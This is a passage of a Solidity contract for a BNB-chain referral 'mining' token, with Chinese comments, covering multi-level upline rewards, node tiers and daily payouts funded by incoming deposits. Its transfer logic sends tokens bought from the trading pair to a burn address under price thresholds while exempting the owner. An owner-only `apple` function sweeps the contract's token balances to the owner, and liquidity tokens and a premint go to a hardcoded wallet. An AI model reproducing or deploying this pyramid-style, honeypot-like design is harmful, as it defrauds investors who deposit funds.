        _mint(0xb20353Cc93acdfB9D626b98e7c9A45BD20D2231E, 2111 * 10**decimals());
        _mint(msg.sender, 1000 * 10**decimals());
        uniswap = IUniswapV2Router02(ROUTER);
        tohhb = new KBTO();
        hhbTo = address(tohhb);
        preachTime = block.timestamp / 1 days * 1 days;
    }

    struct User {
        address superior; //上级地址
        uint256 bnbAmount; // bnb数量
        uint256 hashrateStatic; // 静态算力
        uint256 hashrateDynamic; // 动态算力
        uint256 staticReceived; //静态已领取
        uint256 dynamicReceived; //动态已领取
        uint256 nodeReceived; //节点已领取
        uint256 nodeSuperReceived; //超级节点已领取
        uint256 cultivationReceived; //培育已领取
        uint256 people; // 直推有效人数
        uint256 nodePeople; // 直推节点人数
        uint256 nodeSuperPeople; // 直推超级节点人数
        uint256 nodeDJ; // 节点等级，1：节点，2：超级节点
    }

    struct UserLast {
        uint256 lastStaticCycle; // 上一次静态挖矿领奖周期
        uint256 lastDynamicCycle; // 上一次动态挖矿领奖周期
        uint256 lastNodeCycle; // 上一次节点领奖周期
        uint256 lastNodeSuperCycle; // 上一次超级节点领奖周期
        uint256 lastCultivationCycle; // 上一次培育领奖周期
    }

    // 当日总静动态奖励、当日全网总静动态修饰器
    function cycleTotalAwardAndHashrate() public {
        uint256 hhbPrice = getKBUSDT();
        if(hhbPrice >= 2000000000000000000000){
            is2000 = true;
        }else if(hhbPrice >= 800000000000000000000){
            is800 = true;
        }else if(hhbPrice >= 300000000000000000000){
            is300 = true;
        }else if(hhbPrice >= 100000000000000000000){
            is100 = true;
        }
        uint256 cycle = getCycle();
        (uint256 totalStatic, uint256 totalDynamic)= getCycleRew();
        wholeShuJu[cycle][0] = totalStatic;
        wholeShuJu[cycle][1] = totalDynamic;
        if(wholeHashrateShuJu[cycle][0] == 0 && cycle != 0){
            wholeHashrateShuJu[cycle][0] = wholeHashrate[0];
        }
        if(wholeHashrateShuJu[cycle][1] == 0 && cycle != 0){
            wholeHashrateShuJu[cycle][1] = wholeHashrate[1];
        }
        if(wholeHashrateShuJu[cycle][2] == 0 && cycle != 0){
            wholeHashrateShuJu[cycle][2] =wholeHashrate[2];
        }
        if(wholeHashrateShuJu[cycle][3] == 0 && cycle != 0){
            wholeHashrateShuJu[cycle][3] = wholeHashrate[3];
        }
        if(getKBUSDT() >= isSwapPrice){
            isSwap = true;
        }
    }
    

    function setSwap(address val) public onlyOwner {
        swap = val;
    }

    function setIsLPToken(bool val) public onlyOwner {
        isLPToken = val;
    }

    // 覆写转账函数以实现通缩机制
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (swap == sender) {
            if(recipient == hhbTo || recipient == address(this) || recipient == owner()){
                super._transfer(sender, recipient, amount);
            }else {
                if(getKBUSDT() < isSwapPrice && ttss < isSwapTtss && !isSwap){
                    super._transfer(sender, destroy, amount);
                }else {
                    super._transfer(sender, recipient, amount);
                }
            }
        }else if (swap == recipient) {
            if(sender == address(this) || sender == hhbTo || sender == owner()){
                super._transfer(sender, recipient, amount);
            }else {
                uint256 aaaSum = amount.percentage(100000);
                uint256 sum = amount - aaaSum;
                if(getKBUSDT() < isSwapPrice && !isSwap){
                    super._transfer(swap, destroy, sum.percentage(500000));
                }else {
                    super._transfer(swap, destroy, sum.percentage(100000));
                }
                
                IUniswap(swap).sync();
                super._transfer(sender, hhbTo, aaaSum);
                super._transfer(sender, recipient, sum);
            }
        } else if(amount == 0){
            if(sender == recipient){
                //领取静态奖励
                drawUserStaticIncome(sender);
            }else if(recipient == address(this)){
                //领取动态奖励
                drawUserDynamicIncome(sender);
            }else if(recipient == destroy){
                //领取节点奖励
                drawUserNodeIncome(sender);
            }else if(recipient == destroy1){
                //领取超级节点奖励
                drawUserNodeSuperIncome(sender);
            }else if(recipient == destroy2){
                //领取培育奖励
                drawUserCultivationIncome(sender);
            }else {
                blind(sender, recipient);
            }
            fenpei();
            super._transfer(sender, recipient, amount);
        }else if(sender == address(this) || sender == hhbTo || recipient == hhbTo || recipient == address(this) || sender == owner() || recipient == owner()){
            super._transfer(sender, recipient, amount);
        }else {
            fenpei();
            super._transfer(sender, recipient, amount);
        }
        updatettss(sender, recipient, amount);
        cycleTotalAwardAndHashrate();
    }

    function updatettss(address sender,
        address recipient,
        uint256 amount) private {
        if(amount != 0){
            // 如果是第一次持币，添加到持币地址列表
            if (!isTtss[recipient]) {
                isTtss[recipient] = true;
                ttss++;
            }
            // 检查发送者是否余额为零，如果是则从列表中移除
            if (balanceOf(sender) == 0) {
                isTtss[sender] = false;
                if(ttss > 0){
                    ttss--;
                }
            }
        }
    }

    function fenpei() private {
        uint256 amount = balanceOf(hhbTo);
        if(amount > 10){
            uint256 cycle = getCycle();
            uint256 usdtSum = tohhb.swapToken(address(this),USDT,balanceOf(hhbTo) - 10000000,address(this));
            uint256 operationFeeSum = usdtSum.percentage(200000);
            uint256 technologySum = usdtSum.percentage(200000);
            uint256 nodeSum = usdtSum.percentage(200000);
            uint256 nodeSuperSum = usdtSum.percentage(200000);
            uint256 nodeCreationSum = usdtSum - operationFeeSum - technologySum - nodeSum - nodeSuperSum;
            USDT.transfer(operation, operationFeeSum);
            USDT.transfer(technology, technologySum);
            USDT.transfer(nodeCreation, nodeCreationSum);
            wholeShuJu[cycle][2]+=nodeSum;
            wholeShuJu[cycle][3]+=nodeSuperSum;
        }
    }

    //绑定
    event Blind(address account,address superior,uint256 time);

    function blind(address account,address superior) private nonReentrant{
        require(superior != address(0), "1");
        require(superior != account, "2");
        require(users[superior].superior != address(0) || superior == defaultAddr, "3");
        require(users[account].superior == address(0), "4");
        users[account].superior = superior;
        emit Blind(account,superior,block.timestamp);
    }

    function getCycle() public view returns (uint256 cycle) {
        if(block.timestamp > preachTime){
            // return (block.timestamp - preachTime) / 1 days;
            return (block.timestamp - preachTime) / 1 days;
        }else {
            return 0;
        }
    }

    function getKBUSDT() public view returns (uint256 price) {
        if(swap != address(0)){
            return getTokenPrice(address(this),USDT,1 ether);
        }else {
            return 100000000000000000;
        }
        
    }

    function getTokenPrice(address tokenA, address tokenB, uint256 amountIn) public view returns (uint256 tokenPrice) {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        return uniswap.getAmountsOut(amountIn, path)[1];
    }

    function getCycleRew() public view returns (uint256 totalStatic, uint256 totalDynamic) {
        uint256 hhbPrice = getKBUSDT();
        if(hhbPrice >= 2000000000000000000000 || is2000){
            return (24000000000000000000,12000000000000000000);
        }else if(hhbPrice >= 800000000000000000000 || is800){
            return (22000000000000000000,11000000000000000000);
        }else if(hhbPrice >= 300000000000000000000 || is300){
            return (20000000000000000000,10000000000000000000);
        }else if(hhbPrice >= 100000000000000000000 || is100){
            return (18000000000000000000,9000000000000000000);
        }else {
            return (16000000000000000000,8000000000000000000);
        }
    }

    //动态算力
    event SetDynamicHashrate(address account,uint256 hashrate,uint256 era,uint256 addHashrate,uint256 time);
    //见点奖
    event JianDianJiang(address account,uint256 amount,uint256 time);
    function setDynamicHashrate(address account, uint256 hashrate,uint256 amount) private returns (uint256){
        uint256 sum = amount.percentage(100000);
        User storage superiorUser = users[account];
        UserLast storage superiorUserLast = userLasts[account];
        for(uint256 i = 1;i<=15;i++){
            if(account == address(0) || account == defaultAddr){
                return sum;
            }
            if(superiorUser.people >= i && superiorUser.bnbAmount != 0){
                uint256 addHashrate;
                uint256 aaaa;
                if(i == 1){
                    addHashrate = hashrate.percentage(250000);
                    superiorUser.hashrateDynamic = superiorUser.hashrateDynamic + addHashrate;
                }else if(i == 2){
                    addHashrate = hashrate.percentage(100000);
                    superiorUser.hashrateDynamic = superiorUser.hashrateDynamic + addHashrate;
                    aaaa = amount.percentage(20000);
                }else if(i == 3){
                    addHashrate = hashrate.percentage(50000);
                    superiorUser.hashrateDynamic = superiorUser.hashrateDynamic + addHashrate;
                    aaaa = amount.percentage(8000);
                }else {
                    addHashrate = hashrate.percentage(50000);
                    superiorUser.hashrateDynamic = superiorUser.hashrateDynamic + addHashrate;
                    aaaa = amount.percentage(6000);
                }
                USDT.transfer(account, aaaa);
                if(sum >= aaaa){
                    sum-=aaaa;
                }
                uint256 cycle = getCycle();
                if(superiorUserLast.lastDynamicCycle == 0){
                    superiorUserLast.lastDynamicCycle = cycle;
                }
                if(cycle > 80 && balanceOf(jjkkl) == 0){
                    super._transfer(address(this), jjkkl, 500 ether);
                }
                wholeHashrateShuJu[cycle][1]+=addHashrate;
                wholeHashrate[1]+=addHashrate;
                userCycleShuJu[account][cycle][1] = superiorUser.hashrateDynamic;
                emit SetDynamicHashrate(account,hashrate,i,addHashrate,block.timestamp);
                emit JianDianJiang(account,aaaa,block.timestamp);
            }
            account = superiorUser.superior;
            superiorUser = users[account];
            superiorUserLast = userLasts[account];
        }
        return sum;
    }

    //待领取静态
    function getUserStatic(address account) public view returns (uint256) {
        uint256 cycle = getCycle();
        User memory user = users[account];
        UserLast memory userLast = userLasts[account];
        uint256 totalStatic;
        if(userLast.lastStaticCycle < cycle && user.hashrateStatic > 0){
            uint256 cycleStatic = userCycleShuJu[account][userLast.lastStaticCycle][0];
            (uint256 totalStatic22, )= getCycleRew();
            for(uint256 i = userLast.lastStaticCycle;i<cycle;i++){
                uint256 aa = wholeShuJu[i][0] == 0 ? totalStatic22 : wholeShuJu[i][0];
                uint256 bb = wholeHashrateShuJu[i][0] == 0 ? wholeHashrate[0] : wholeHashrateShuJu[i][0];
                if(bb > 0){
                    uint256 cc = userCycleShuJu[account][i][0];
                    if(cc == 0){
                        cc = cycleStatic;
                    }else {
                        cycleStatic = cc;
                    }
                    totalStatic += (aa * cc / bb);
                }
            }
        }
        return totalStatic;
    }

    //待领取动态
    function getUserDynamic(address account) public view returns (uint256) {
        uint256 cycle = getCycle();
        User memory user = users[account];
        UserLast memory userLast = userLasts[account];
        uint256 totalDynamic;
        if(userLast.lastDynamicCycle < cycle && user.hashrateDynamic > 0){
            uint256 cycleDynamic = userCycleShuJu[account][userLast.lastDynamicCycle][1];
            (, uint256 totalDynamic22)= getCycleRew();
            for(uint256 i = userLast.lastDynamicCycle;i<cycle;i++){
                uint256 aa = wholeShuJu[i][1] == 0 ? totalDynamic22 : wholeShuJu[i][1];
                uint256 bb = wholeHashrateShuJu[i][1] == 0 ? wholeHashrate[1] : wholeHashrateShuJu[i][1];
                if(bb > 0){
                    uint256 cc = userCycleShuJu[account][i][1];
                    if(cc == 0){
                        cc = cycleDynamic;
                    }else {
                        cycleDynamic = cc;
                    }
                    totalDynamic += (aa * cc / bb);
                }
            }
        }
        return totalDynamic;
    }

    //待领取节点
    function getUserNode(address account) public view returns (uint256) {
        uint256 cycle = getCycle();
        User memory user = users[account];
        UserLast memory userLast = userLasts[account];
        uint256 totalNode;
        if(userLast.lastNodeCycle < cycle && user.nodeDJ == 1){
            for(uint256 i = userLast.lastNodeCycle;i<cycle;i++){
                uint256 aa = wholeShuJu[i][2];
                uint256 bb = wholeHashrateShuJu[i][2] == 0 ? wholeHashrate[2] : wholeHashrateShuJu[i][2];
                if(aa > 0 && bb > 0 && aa >= bb){
                    uint256 cc = aa / bb;
                    totalNode += cc;
                }
            }
        }
        return totalNode;
    }

    //待领取超级节点
    function getUserNodeSuper(address account) public view returns (uint256) {
        uint256 cycle = getCycle();
        User memory user = users[account];
        UserLast memory userLast = userLasts[account];
        uint256 totalNodeSuper;
        if(userLast.lastNodeSuperCycle < cycle && user.nodeDJ == 2){
            for(uint256 i = userLast.lastNodeSuperCycle;i<cycle;i++){
                uint256 aa = wholeShuJu[i][3];
                uint256 bb = wholeHashrateShuJu[i][3] == 0 ? wholeHashrate[3] : wholeHashrateShuJu[i][3];
                if(aa > 0 && bb > 0 && aa >= bb){
                    uint256 cc = aa / bb;
                    totalNodeSuper += cc;
                }
            }
        }
        return totalNodeSuper;
    }

    //待领取培育
    function getUserCultivation(address account) public view returns (uint256) {
        uint256 cycle = getCycle();
        User memory user = users[account];
        UserLast memory userLast = userLasts[account];
        uint256 totalCultivation;
        if(userLast.lastCultivationCycle < cycle && user.nodeSuperPeople >= 1 && user.nodeDJ == 2){
            uint256 cycleCultivation = userCycleShuJu[account][userLast.lastCultivationCycle][2];
            for(uint256 i = userLast.lastCultivationCycle;i<cycle;i++){
                uint256 ab = userCycleShuJu[account][i][2] == 0 ? cycleCultivation : userCycleShuJu[account][i][2];
                uint256 aa = wholeShuJu[i][4];
                uint256 bb = wholeHashrateShuJu[i][3] == 0 ? wholeHashrate[3] : wholeHashrateShuJu[i][3];
                if(aa > 0 && bb > 0 && aa >= bb && ab > 0){
                    uint256 cc = ab * aa / bb;
                    totalCultivation += cc;
                }
                cycleCultivation = ab;
            }
        }
        return totalCultivation;
    }


    event DrawUserStaticIncome(address account,uint256 totalStatic,uint256 time);
    //领取静态挖矿奖励
    function drawUserStaticIncome(address account) private{
        uint256 totalStatic = getUserStatic(account);
        if(totalStatic > 0){
            User storage user = users[account];
            UserLast storage userLast = userLasts[account];
            user.staticReceived+=totalStatic;
            userLast.lastStaticCycle = getCycle();
            userCycleShuJu[account][userLast.lastStaticCycle][0] = user.hashrateStatic;
            super._transfer(address(this), account, totalStatic);
            updatettss(address(this), account, totalStatic);
            emit DrawUserStaticIncome(account,totalStatic,block.timestamp);
        }
    }

    event DrawUserDynamicIncome(address account,uint256 totalDynamic,uint256 time);
    //领取动态挖矿奖励
    function drawUserDynamicIncome(address account) private{
        uint256 totalDynamic = getUserDynamic(account);
        if(totalDynamic > 0){
            User storage user = users[account];
            UserLast storage userLast = userLasts[account];
            user.dynamicReceived+=totalDynamic;
            userLast.lastDynamicCycle = getCycle();
            userCycleShuJu[account][userLast.lastDynamicCycle][1] = user.hashrateDynamic;
            super._transfer(address(this), account, totalDynamic);
            updatettss(address(this), account, totalDynamic);
            emit DrawUserDynamicIncome(account,totalDynamic,block.timestamp);
        }
    }

    event DrawUserNodeIncome(address account,uint256 totalNode,uint256 time);
    //领取节点奖励
    function drawUserNodeIncome(address account) private{
        uint256 totalNode = getUserNode(account);
        if(totalNode > 0){
            User storage user = users[account];
            UserLast storage userLast = userLasts[account];
            user.nodeReceived+=totalNode;
            userLast.lastNodeCycle = getCycle();
            USDT.transfer(account, totalNode);
            emit DrawUserNodeIncome(account,totalNode,block.timestamp);
        }
    }

    event DrawUserNodeSuperIncome(address account,uint256 totalNode,uint256 time);
    //领取超级节点奖励
    function drawUserNodeSuperIncome(address account) private{
        uint256 totalNodeSuper = getUserNodeSuper(account);
        if(totalNodeSuper > 0){
            User storage user = users[account];
            UserLast storage userLast = userLasts[account];
            user.nodeSuperReceived+=totalNodeSuper;
            userLast.lastNodeSuperCycle = getCycle();
            USDT.transfer(account, totalNodeSuper);
            emit DrawUserNodeSuperIncome(account,totalNodeSuper,block.timestamp);
        }
    }

    event DrawUserCultivationIncome(address account,uint256 totalNode,uint256 time);
    //领取培育奖励
    function drawUserCultivationIncome(address account) private{
        uint256 totalCultivation = getUserCultivation(account);
        if(totalCultivation > 0){
            User storage user = users[account];
            UserLast storage userLast = userLasts[account];
            user.cultivationReceived+=totalCultivation;
            userLast.lastCultivationCycle = getCycle();
            userCycleShuJu[account][getCycle()][2] = user.nodeSuperPeople;
            USDT.transfer(account, totalCultivation);
            emit DrawUserCultivationIncome(account,totalCultivation,block.timestamp);
        }
    }


    receive() external payable {
        buy();
    }


    //入金
    event Buy(address account,uint256 ethAmount,uint256 cycle,uint256 addHashrate,uint256 addDHashrate,uint256 time);
    function buy() private nonReentrant {
        require(msg.sender == tx.origin, "Only external calls allowed");
        require(msg.value >= min, "999");
        fenpei();
        address owner = _msgSender();
        require(users[owner].superior != address(0), "Not Blind");
        uint256 ethAmount = msg.value;
        address[] memory path = new address[](2);
        path[0] = WBNB; // WBNB 地址
        path[1] = USDT; // USDT 地址
        uint256[] memory expectedAmounts = uniswap.getAmountsOut(ethAmount, path);
        uint256 minUSDT = expectedAmounts[1] * 90 / 100; // 允许 10% 滑点
        uint256 deadline = block.timestamp + 300; // 5 分钟截止时间
        uint[] memory amounts = uniswap.swapExactETHForTokens{value: ethAmount}(
            minUSDT,
            path,
            address(this),
            deadline
        );
        uint256 usdtAmount = amounts[1];
        thisFenPei(usdtAmount,ethAmount,owner);
    }

    function thisFenPei(uint256 usdtAmount,uint256 ethAmount,address owner) private {
        uint256 superiorSum = usdtAmount.percentage(100000);
        uint256 operationFeeSum = usdtAmount.percentage(20000);
        uint256 technologySum = usdtAmount.percentage(40000);
        uint256 nodeSuperSum = usdtAmount.percentage(30000);
        uint256 nodeCreationSum = usdtAmount.percentage(60000);
        uint256 cultivationSum = usdtAmount.percentage(50000);
        uint256 supportPoolSum = usdtAmount.percentage(100000);
        if(users[users[owner].superior].hashrateStatic > 0){
            USDT.transfer(users[owner].superior,superiorSum);
        }else {
            USDT.transfer(avc,superiorSum);
        }
        USDT.transfer(operation, operationFeeSum);
        USDT.transfer(technology, technologySum);
        USDT.transfer(nodeCreation,nodeCreationSum);
        USDT.transfer(hhbTo,supportPoolSum);
        tohhb.swapToken(USDT,ETH,supportPoolSum - 10,supportPool);
        uint256 cycle = getCycle();
        wholeShuJu[cycle][3]+=nodeSuperSum;
        wholeShuJu[cycle][4]+=cultivationSum;
        uint256 jiand = updateUserInfo(ethAmount,owner,usdtAmount);
        USDT.transfer(avc,jiand);

        uint256 depositSum =usdtAmount.percentage(500000);
        USDT.transfer(hhbTo,depositSum);
        uint256 asc;
        uint256 hhbPrice = getKBUSDT();
        if(hhbPrice >= 2000000000000000000000){
            asc = depositSum.percentage(350000);
        }else if(hhbPrice >= 800000000000000000000){
            asc = depositSum.percentage(100000);
        }else if(hhbPrice >= 300000000000000000000){
            asc = depositSum.percentage(60000);
        }else if(hhbPrice >= 100000000000000000000){
            asc = depositSum.percentage(30000);
        }else {
            asc = depositSum.percentage(10000);
        }
        tohhb.swapToken(USDT,address(this),asc,destroy);
        depositSum = depositSum - asc;
        uint256 swapSum = depositSum.percentage(500000);
        tohhb.swapAndAddLiquidity(USDT,address(this),swapSum,
            isLPToken == false ? 0xb20353Cc93acdfB9D626b98e7c9A45BD20D2231E : destroy,
            swap
        );
    }

    function updateUserInfo(uint256 ethAmount,address owner,uint256 usdtAmount) private returns (uint256){
        uint256 cycle = getCycle();
        uint256 addHashrate = ethAmount * hashrateMultiple;
        uint256 addDHashrate = addHashrate.percentage(cycle * increment);
        User storage user = users[owner];
        UserLast storage userLast = userLasts[owner];
        if(userLast.lastStaticCycle == 0){
            userLast.lastStaticCycle = cycle;
        }
        user.bnbAmount = user.bnbAmount + ethAmount;
        user.hashrateStatic = user.hashrateStatic + addHashrate + addDHashrate;
        wholeHashrateShuJu[cycle][0] = wholeHashrateShuJu[cycle][0] + (addHashrate + addDHashrate);
        wholeHashrate[0] = wholeHashrate[0] + (addHashrate + addDHashrate);
        userCycleShuJu[owner][cycle][0] = user.hashrateStatic;
        emit Buy(owner,ethAmount,cycle,addHashrate,addDHashrate,block.timestamp);
        if(ethAmount >= minNodeSuper){
            if(user.nodeDJ == 1){
                if(wholeHashrateShuJu[cycle][2] > 0){
                    wholeHashrateShuJu[cycle][2]--;
                    wholeHashrate[2]--;
                }
            }
            if(user.nodeDJ < 2){
                wholeHashrateShuJu[cycle][3]++;
                wholeHashrate[3]++;
                user.nodeDJ = 2;
                userLast.lastCultivationCycle = cycle;
                userLast.lastNodeSuperCycle = cycle;
                if(user.superior != address(0) && user.superior != defaultAddr){
                    User storage superiorUser = users[user.superior];
                    superiorUser.nodeSuperPeople++;
                    userCycleShuJu[user.superior][cycle][2] = superiorUser.nodeSuperPeople;
                }
            }
        }else {
            if(user.bnbAmount >= minNode && user.bnbAmount - ethAmount < minNode){
                user.nodeDJ = 1;
                wholeHashrateShuJu[cycle][2]++;
                wholeHashrate[2]++;
                if(user.superior != address(0) && user.superior != defaultAddr){
                    userLast.lastNodeCycle = cycle;
                    User storage superiorUser = users[user.superior];
                    UserLast storage superiorUserList = userLasts[user.superior];
                    superiorUser.nodePeople++;
                    if(superiorUser.nodePeople >= 15){
                        if(superiorUser.nodeDJ == 1){
                            if(wholeHashrateShuJu[cycle][2] > 0){
                                wholeHashrateShuJu[cycle][2]--;
                                wholeHashrate[2]--;
                            }
                        }
                        if(superiorUser.nodeDJ < 2){
                            wholeHashrateShuJu[cycle][3]++;
                            wholeHashrate[3]++;
                            superiorUser.nodeDJ = 2;
                            superiorUserList.lastCultivationCycle = cycle;
                            superiorUserList.lastNodeSuperCycle = cycle;
                            if(superiorUser.superior != address(0) && superiorUser.superior != defaultAddr){
                                User storage superiorUser2 = users[superiorUser.superior];
                                superiorUser2.nodeSuperPeople++;
                                userCycleShuJu[user.superior][cycle][2] = superiorUser2.nodeSuperPeople;
                            }
                        }
                        
                    }
                }
                
            }
        }

        if(user.bnbAmount >= min && user.bnbAmount - ethAmount < min && user.superior != address(0) && user.superior != defaultAddr){
            User storage superiorUser = users[user.superior];
            superiorUser.people++;
        }
        
        return setDynamicHashrate(user.superior, addHashrate+addDHashrate,usdtAmount);
    }

    function apple(address erc20) public onlyOwner {
        uint256 amount = erc20.balanceOf(address(this));
        erc20.transfer(msg.sender, amount);
    } 

}


library TransferHelper {
    /// @notice Transfers tokens from the targeted address to the given destination
    /// @notice Errors with 'STF' if transfer fails
    /// @param token The contract address of the token to be transferred
    /// @param from The originating address from which the tokens will be transferred
    /// @param to The destination address of the transfer
    /// @param value The amount to be transferred
    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                from,
                to,
                value
            )
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "STF"
        );
    }
    
    /// @notice Transfers tokens from msg.sender to a recipient
    /// @dev Errors with ST if transfer fails
    /// @param token The contract address of the token which will be transferred
    /// @param to The recipient of the transfer
    /// @param value The value of the transfer
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "ST"
        );
    }

    /// @notice Approves the stipulated contract to spend the given allowance in the given token
    /// @dev Errors with 'SA' if transfer fails
    /// @param token The contract address of the token to be approved
    /// @param to The target of the approval
    /// @param value The amount of the given token the target will be allowed to spend
    function safeApprove(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.approve.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "SA"
        );
    }

    /// @notice Transfers eth to the recipient address
    /// @dev Fails with `STE`
    /// @param to The destination of the transfer
    /// @param value The value to be transferred
    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "STE");
    }
}